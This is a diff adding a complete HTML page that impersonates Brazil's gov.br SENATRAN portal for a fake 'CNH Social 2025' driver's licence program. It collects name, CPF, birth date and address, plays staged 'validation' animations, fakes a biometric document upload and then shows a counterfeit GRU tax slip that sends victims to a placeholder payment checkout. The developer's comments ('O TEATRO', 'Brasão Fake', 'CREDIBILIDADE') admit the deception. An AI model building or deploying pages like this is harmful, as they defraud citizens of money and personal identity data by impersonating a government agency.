@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gov.br - Inscrição CNH Social 2025</title>
+    <!-- Fontes Oficiais -->
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@300;400;500;600;700;800&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- Ícones -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+    <style>
+        /* --- DSGOV - Design System do Governo Federal --- */
+        :root {
+            --gov-blue-p: #1351b4; /* Azul Puro */
+            --gov-blue-d: #0c326f; /* Azul Escuro */
+            --gov-bg: #f8f8f8;
+            --gov-text: #333;
+            --gov-green: #168821;
+            --gov-divider: #e6e6e6;
+        }
+
+        * { box-sizing: border-box; outline: none; }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Rawline', 'Roboto', sans-serif;
+            background-color: var(--gov-bg);
+            color: var(--gov-text);
+            padding-bottom: 80px;
+        }
+
+        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
+        .hidden { display: none !important; }
+
+        /* HEADER */
+        .gov-top-bar { background: #000; color: white; padding: 6px 0; font-size: 11px; font-weight: 700; text-transform: uppercase; }
+        .gov-top-content { display: flex; justify-content: space-between; }
+        .gov-top-bar a { color: white; text-decoration: none; margin-left: 20px; }
+
+        .header-section { background: white; padding: 25px 0; border-bottom: 1px solid #ccc; }
+        .header-flex { display: flex; align-items: center; justify-content: space-between; }
+        .logo-gov { color: var(--gov-blue-p); font-size: 38px; font-weight: 900; font-style: italic; letter-spacing: -1.5px; margin-right: 15px; }
+        .service-name { border-left: 1px solid #999; padding-left: 15px; font-size: 14px; color: #555; line-height: 1.3; }
+        .service-name strong { display: block; color: var(--gov-blue-p); font-size: 18px; }
+
+        /* BREADCRUMBS */
+        .breadcrumbs { font-size: 13px; color: #666; padding: 20px 0; }
+        .breadcrumbs span { color: var(--gov-blue-p); font-weight: 600; }
+
+        /* CARDS */
+        .gov-card { background: white; border-radius: 6px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); padding: 40px; margin-bottom: 30px; border: 1px solid #e0e0e0; }
+        .card-title { color: var(--gov-blue-p); font-size: 26px; font-weight: 700; margin-top: 0; margin-bottom: 10px; }
+        .card-subtitle { color: #555; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
+
+        /* FORMS */
+        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .full-width { grid-column: span 2; }
+        
+        .input-group { margin-bottom: 15px; }
+        label { display: block; font-weight: 600; font-size: 14px; margin-bottom: 6px; color: #222; }
+        input[type="text"], input[type="date"] {
+            width: 100%; padding: 12px; border: 1px solid #888; border-radius: 4px; font-size: 16px;
+            transition: 0.2s; background: #fff;
+        }
+        input:focus { border-color: var(--gov-blue-p); box-shadow: 0 0 0 3px rgba(19,81,180,0.2); }
+        input[readonly] { background-color: #eee; color: #666; }
+
+        /* BOTÕES */
+        .btn-gov {
+            background-color: var(--gov-blue-p); color: white; border: none; padding: 14px 40px;
+            border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer;
+            display: inline-flex; align-items: center; gap: 10px; transition: 0.3s;
+        }
+        .btn-gov:hover { background-color: var(--gov-blue-d); transform: translateY(-1px); }
+        .btn-center { display: flex; justify-content: center; margin-top: 20px; }
+
+        /* LOADING SERPRO STYLE */
+        .loading-step { display: flex; align-items: center; gap: 15px; padding: 15px 0; border-bottom: 1px solid #eee; font-size: 15px; color: #555; }
+        .spinner { color: var(--gov-blue-p); animation: spin 1s linear infinite; }
+        .check { color: var(--gov-green); font-size: 18px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+
+        /* UPLOAD BOX */
+        .upload-container { 
+            border: 2px dashed var(--gov-blue-p); background: #f2f7fd; border-radius: 8px; 
+            padding: 40px; text-align: center; cursor: pointer; transition: 0.2s;
+        }
+        .upload-container:hover { background: #e6f0fa; }
+        
+        /* GRU CUSTOMIZADA */
+        .gru-paper {
+            border: 1px solid #333; background: #fff; font-family: 'Courier New', monospace; 
+            padding: 2px; position: relative; margin-top: 20px;
+        }
+        .gru-inner { border: 1px solid #333; padding: 15px; }
+        
+        .gru-header { display: flex; gap: 15px; border-bottom: 2px solid #000; padding-bottom: 15px; margin-bottom: 10px; }
+        .gru-logo img { width: 50px; }
+        .gru-header-text h4 { margin: 0; font-size: 14px; }
+        .gru-header-text p { margin: 2px 0 0; font-size: 11px; }
+
+        .gru-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }
+        .gru-table th { text-align: left; border-bottom: 1px solid #000; padding: 5px; background: #eee; }
+        .gru-table td { padding: 8px 5px; border-bottom: 1px solid #ccc; }
+        .gru-total-row { font-weight: bold; font-size: 16px; background: #f0f0f0; }
+
+        .gru-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; font-size: 12px; font-weight: bold; }
+        .gru-box { border: 1px solid #000; padding: 5px; }
+        .gru-label { font-size: 9px; color: #555; display: block; margin-bottom: 2px; }
+
+        /* FOOTER */
+        footer { background: var(--gov-blue-d); color: white; padding: 40px 0; margin-top: 50px; font-size: 13px; }
+        footer a { color: white; text-decoration: none; opacity: 0.8; display: block; margin-bottom: 5px; }
+
+        @media(max-width: 700px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .full-width { grid-column: span 1; }
+            .gru-info-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- BARRA SUPERIOR -->
+    <div class="gov-top-bar">
+        <div class="container gov-top-content">
+            <div>
+                <a href="#">Brasil</a>
+                <a href="#">Acesso à informação</a>
+                <a href="#">Legislação</a>
+            </div>
+            <div><a href="#">Órgãos do Governo</a></div>
+        </div>
+    </div>
+
+    <!-- HEADER PRINCIPAL -->
+    <header class="header-section">
+        <div class="container header-flex">
+            <div style="display: flex; align-items: center;">
+                <div class="logo-gov">gov.br</div>
+                <div class="service-name">
+                    <strong>Ministério da Infraestrutura</strong>
+                    Secretaria Nacional de Trânsito - SENATRAN
+                </div>
+            </div>
+            <div>
+                <button style="background:none;border:none;font-weight:bold;color:#333;">Entrar com gov.br</button>
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="breadcrumbs">
+            Início > Serviços > Trânsito > Habilitação > <span>Programa CNH Social 2025</span>
+        </div>
+
+        <!-- ETAPA 1: COLETA DE DADOS MASSIVA -->
+        <div id="step-1" class="gov-card">
+            <h1 class="card-title"> Consulta Pública - CNH Simplificada 2025</h1>
+            <p class="card-subtitle" style="font-size: 14px; background: #fff8e1; border-left: 4px solid #ffcd07; padding: 15px; border-radius: 4px; color: #333; line-height: 1.6;">
+                <strong>Instruções Obrigatórias:</strong><br>
+                Preencha os dados abaixo para validar sua elegibilidade junto à <strong>Receita Federal</strong> e ao <strong>SERPRO</strong>. A precisão das informações é fundamental para a isenção automática das taxas de CFC (Autoescola).
+                <br><br>
+                <span style="color: #b71c1c; font-weight: 700;">⚠️ AVISO LEGAL:</span> 
+                A inserção dolosa de dados inverídicos neste sistema pode configurar crime de <strong>Falsidade Ideológica</strong> (Art. 299 do Código Penal Brasileiro), sujeitando o infrator às sanções penais e administrativas cabíveis.
+            </p>  
+
+            <div class="form-grid">
+                <div class="input-group full-width">
+                    <label>Nome Completo (Sem abreviações)</label>
+                    <input type="text" id="nome" oninput="this.value = this.value.toUpperCase()">
+                </div>
+                
+                <div class="input-group">
+                    <label>CPF</label>
+                    <input type="text" id="cpf" maxlength="14" oninput="mascaraCPF(this)" placeholder="000.000.000-00">
+                </div>
+                
+                <div class="input-group">
+                    <label>Data de Nascimento</label>
+                    <input type="date" id="nasc">
+                </div>
+
+                <div class="input-group">
+                    <label>CEP (Busca Automática)</label>
+                    <input type="text" id="cep" maxlength="9" onblur="buscarCEP(this.value)" placeholder="00000-000">
+                </div>
+
+                <div class="input-group">
+                    <label>Número</label>
+                    <input type="text" id="numero">
+                </div>
+
+                <div class="input-group full-width">
+                    <label>Endereço / Logradouro</label>
+                    <input type="text" id="endereco" readonly>
+                </div>
+
+                <div class="input-group">
+                    <label>Bairro</label>
+                    <input type="text" id="bairro" readonly>
+                </div>
+
+                <div class="input-group">
+                    <label>Cidade / UF</label>
+                    <input type="text" id="cidade" readonly>
+                </div>
+                
+                <div class="input-group full-width">
+                    <label>Complemento / Lote / Quadra</label>
+                    <input type="text" id="comp" placeholder="Ex: Casa A, Apto 101, Lote 4">
+                </div>
+            </div>
+
+            <div class="btn-center">
+                <button class="btn-gov" onclick="irParaAnalise()">
+                    Avançar para Documentação <i class="fas fa-chevron-right"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- ETAPA 2: PROCESSAMENTO (O TEATRO) -->
+        <div id="step-2" class="gov-card hidden">
+            <h1 class="card-title">Processando Solicitação...</h1>
+            <p class="card-subtitle">Aguarde enquanto o sistema valida seus dados cadastrais nas bases governamentais.</p>
+
+            <div id="check-list">
+                <div class="loading-step" id="step-load-1"><i class="fas fa-circle-notch spinner"></i> Conectando ao DATAPREV...</div>
+                <div class="loading-step" id="step-load-2"><i class="far fa-circle"></i> Validando CPF e Endereço...</div>
+                <div class="loading-step" id="step-load-3"><i class="far fa-circle"></i> Verificando Histórico de Infrações (RENACH)...</div>
+                <div class="loading-step" id="step-load-4"><i class="far fa-circle"></i> Analisando Elegibilidade Social...</div>
+            </div>
+        </div>
+
+        <!-- ETAPA 3: UPLOAD (COMPROMISSO) -->
+        <div id="step-3" class="gov-card hidden">
+            <h1 class="card-title">Validação Biométrica Obrigatória</h1>
+            <p class="card-subtitle">Para concluir a abertura do processo, anexe uma foto legível do seu documento de identificação (RG ou Carteira de Trabalho).</p>
+
+            <div class="upload-container" onclick="simularUpload()">
+                <i class="fas fa-id-card" style="font-size: 48px; color: var(--gov-blue-p); margin-bottom: 20px;"></i>
+                <h3 style="margin: 0; color: #333;">Clique para anexar documento (Frente e Verso)</h3>
+                <p style="font-size: 13px; color: #666; margin-top: 10px;">O sistema fará o reconhecimento automático (OCR).</p>
+            </div>
+
+            <div id="upload-progress" class="hidden" style="margin-top: 20px;">
+                <div style="background: #ddd; height: 10px; border-radius: 5px; overflow: hidden;">
+                    <div id="p-bar" style="background: var(--gov-green); width: 0%; height: 100%; transition: width 0.2s;"></div>
+                </div>
+                <p id="p-text" style="text-align: center; font-size: 13px; margin-top: 5px;">Enviando...</p>
+            </div>
+        </div>
+
+        <!-- ETAPA 4: APROVAÇÃO (DOPAMINA) -->
+        <div id="step-4" class="gov-card hidden" style="border-left: 6px solid var(--gov-green);">
+            <div style="display: flex; gap: 20px; align-items: flex-start;">
+                <i class="fas fa-check-circle" style="font-size: 40px; color: var(--gov-green);"></i>
+                <div>
+                    <h2 style="margin: 0; color: var(--gov-green);">CIDADÃO APTO!</h2>
+                    <p style="margin: 10px 0;">Seu cadastro foi aprovado com sucesso. Você está isento das taxas de CFC (Autoescola).</p>
+                    <p style="font-size: 14px; background: #eee; padding: 5px 10px; display: inline-block; border-radius: 4px;">
+                        <strong>Protocolo:</strong> <span id="protocolo"></span>
+                    </p>
+                </div>
+            </div>
+            <div class="btn-center">
+                <button class="btn-gov" onclick="gerarGRU()">
+                    EMITIR GUIA DE RECOLHIMENTO (GRU) <i class="fas fa-file-invoice"></i>
+                </button>
+            </div>
+        </div>
+
+        <!-- ETAPA 5: A GUIA GRU (O CLIMAX) -->
+        <div id="step-5" class="gov-card hidden">
+            <div style="text-align: center;">
+                <i class="fas fa-print" style="font-size: 40px; color: var(--gov-blue-p); margin-bottom: 10px;"></i>
+                <h1 class="card-title">Guia Gerada com Sucesso</h1>
+                <p class="card-subtitle">Efetue o recolhimento da taxa única para liberar seu acesso ao App.</p>
+            </div>
+
+            <div class="gru-paper">
+                <div class="gru-inner">
+                    <div class="gru-header">
+                        <div class="gru-logo">
+                            <!-- Brasão Fake -->
+                            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/bf/Coat_of_arms_of_Brazil.svg/100px-Coat_of_arms_of_Brazil.svg.png">
+                        </div>
+                        <div class="gru-header-text">
+                            <h4>MINISTÉRIO DA FAZENDA</h4>
+                            <p>SECRETARIA DO TESOURO NACIONAL</p>
+                            <p><strong>GUIA DE RECOLHIMENTO DA UNIÃO - GRU</strong></p>
+                        </div>
+                    </div>
+
+                    <div class="gru-info-grid">
+                        <div class="gru-box">
+                            <span class="gru-label">NOME DO CONTRIBUINTE</span>
+                            <span id="gru-nome">NOME AQUI</span>
+                        </div>
+                        <div class="gru-box">
+                            <span class="gru-label">CPF</span>
+                            <span id="gru-cpf">000.000.000-00</span>
+                        </div>
+                        <div class="gru-box">
+                            <span class="gru-label">CÓDIGO DE RECOLHIMENTO</span>
+                            <span>18823-9 (TAXA ÚNICA RENACH)</span>
+                        </div>
+                        <div class="gru-box">
+                            <span class="gru-label">COMPETÊNCIA</span>
+                            <span>12/2025</span>
+                        </div>
+                        <div class="gru-box">
+                            <span class="gru-label">VENCIMENTO</span>
+                            <span style="color: #c00;">HOJE</span>
+                        </div>
+                        <div class="gru-box">
+                            <span class="gru-label">NÚMERO DE REFERÊNCIA</span>
+                            <span id="gru-ref"></span>
+                        </div>
+                    </div>
+
+                    <!-- TABELA DE IMPOSTOS (CREDIBILIDADE) -->
+                    <table class="gru-table">
+                        <thead>
+                            <tr>
+                                <th>DESCRIÇÃO DA RECEITA</th>
+                                <th style="text-align: right;">VALOR (R$)</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Taxa de Abertura RENACH Digital (Isenção CFC)</td>
+                                <td style="text-align: right;">42,00</td>
+                            </tr>
+                            <tr>
+                                <td>Fundo Nacional de Segurança e Educação (FUNSET) - 2%</td>
+                                <td style="text-align: right;">12,50</td>
+                            </tr>
+                            <tr>
+                                <td>Taxa de Expedição de Documento Digital (ISSQN)</td>
+                                <td style="text-align: right;">13,40</td>
+                            </tr>
+                            <tr class="gru-total-row">
+                                <td>VALOR TOTAL A RECOLHER</td>
+                                <td style="text-align: right;">67,90</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <div style="margin-top: 20px; font-size: 11px; text-align: center;">
+                        <p>A autenticação desta guia será processada automaticamente após a compensação bancária.</p>
+                        <p><strong>NÃO RECEBER APÓS O VENCIMENTO</strong></p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- BOTÃO CHECKOUT -->
+            <button class="btn-gov" style="width: 100%; margin-top: 30px; background-color: var(--gov-green); justify-content: center;" onclick="pagarAgora()">
+                <i class="fas fa-qrcode"></i> PAGAR GRU VIA PIX (BAIXA IMEDIATA)
+            </button>
+            <p style="text-align: center; font-size: 12px; color: #777; margin-top: 10px;">
+                <i class="fas fa-lock"></i> Ambiente Seguro de Pagamento Gov.br
+            </p>
+        </div>
+
+    </div>
+
+    <!-- RODAPÉ -->
+    <footer>
+        <div class="container">
+            <div class="logo-gov" style="color: white; font-size: 24px; margin-bottom: 20px;">gov.br</div>
+            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; font-size: 12px;">
+                <div>
+                    <a href="#">Acesso à informação</a>
+                    <a href="#">Legislação</a>
+                    <a href="#">Parceiros</a>
+                </div>
+                <div>
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">Governo Digital</a>
+                </div>
+                <div>
+                    <p style="margin: 0; opacity: 0.7;">
+                        Secretaria Nacional de Trânsito<br>
+                        CNPJ: 00.394.494/0001-36<br>
+                        Esplanada dos Ministérios, Bloco T<br>
+                        Brasília - DF
+                    </p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // LINK DO SEU CHECKOUT AQUI
+        const CHECKOUT_LINK = "SEU_LINK_DO_PARADISE_AQUI"; 
+
+        // --- FUNÇÕES DE CAMPO ---
+        function mascaraCPF(i) {
+            var v = i.value.replace(/\D/g, "");
+            i.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4").substring(0, 14);
+        }
+
+        // --- INTEGRAÇÃO VIACEP ---
+        function buscarCEP(cep) {
+            cep = cep.replace(/\D/g, '');
+            if (cep.length === 8) {
+                document.getElementById('endereco').value = "Buscando...";
+                fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.erro) {
+                            document.getElementById('endereco').value = data.logradouro;
+                            document.getElementById('bairro').value = data.bairro;
+                            document.getElementById('cidade').value = `${data.localidade} - ${data.uf}`;
+                            document.getElementById('numero').focus();
+                        } else {
+                            alert("CEP não encontrado.");
+                            document.getElementById('endereco').value = "";
+                        }
+                    });
+            }
+        }
+
+        // --- NAVEGAÇÃO ENTRE ETAPAS ---
+        function irParaAnalise() {
+            if(document.getElementById('cpf').value.length < 14 || document.getElementById('nome').value.length < 5) {
+                alert("Por favor, preencha todos os dados obrigatórios.");
+                return;
+            }
+            
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            rodarAnimacaoAnalise();
+        }
+
+        function rodarAnimacaoAnalise() {
+            const steps = [1, 2, 3, 4];
+            let delay = 1500;
+
+            steps.forEach((step, idx) => {
+                setTimeout(() => {
+                    // Marca atual como OK
+                    let el = document.getElementById(`step-load-${step}`);
+                    el.innerHTML = '<i class="fas fa-check-circle check"></i> ' + el.innerText.replace("...", " OK");
+                    el.style.fontWeight = "bold";
+                    el.style.color = "#333";
+                    
+                    // Se houver próximo, bota spinner
+                    if (idx < steps.length - 1) {
+                        let next = document.getElementById(`step-load-${steps[idx+1]}`);
+                        let txt = next.innerText.replace("...", "");
+                        next.innerHTML = `<i class="fas fa-circle-notch spinner"></i> ${txt}...`;
+                    }
+                }, delay);
+                delay += 2000;
+            });
+
+            setTimeout(() => {
+                document.getElementById('step-2').classList.add('hidden');
+                document.getElementById('step-3').classList.remove('hidden');
+            }, delay + 500);
+        }
+
+        function simularUpload() {
+            document.getElementById('upload-progress').classList.remove('hidden');
+            let width = 0;
+            let bar = document.getElementById('p-bar');
+            let txt = document.getElementById('p-text');
+
+            let inv = setInterval(() => {
+                width++;
+                bar.style.width = width + "%";
+                if(width < 40) txt.innerText = "Criptografando dados...";
+                else if(width < 80) txt.innerText = "Validando biometria facial...";
+                else txt.innerText = "Finalizando...";
+
+                if(width >= 100) {
+                    clearInterval(inv);
+                    setTimeout(() => {
+                        document.getElementById('step-3').classList.add('hidden');
+                        document.getElementById('step-4').classList.remove('hidden');
+                        
+                        // Gera protocolo
+                        let rnd = Math.floor(Math.random() * 9000000) + 1000000;
+                        document.getElementById('protocolo').innerText = `2025.${rnd}.SENATRAN-DIGITAL`;
+                    }, 1000);
+                }
+            }, 50);
+        }
+
+        function gerarGRU() {
+            document.getElementById('step-4').classList.add('hidden');
+            document.getElementById('step-5').classList.remove('hidden');
+
+            // Preenche GRU
+            document.getElementById('gru-nome').innerText = document.getElementById('nome').value;
+            document.getElementById('gru-cpf').innerText = document.getElementById('cpf').value;
+            document.getElementById('gru-ref').innerText = "2025." + Math.floor(Math.random() * 1000000000);
+        }
+
+        function pagarAgora() {
+            window.location.href = CHECKOUT_LINK;
+        }
+    </script>
+
+</body>
+</html>
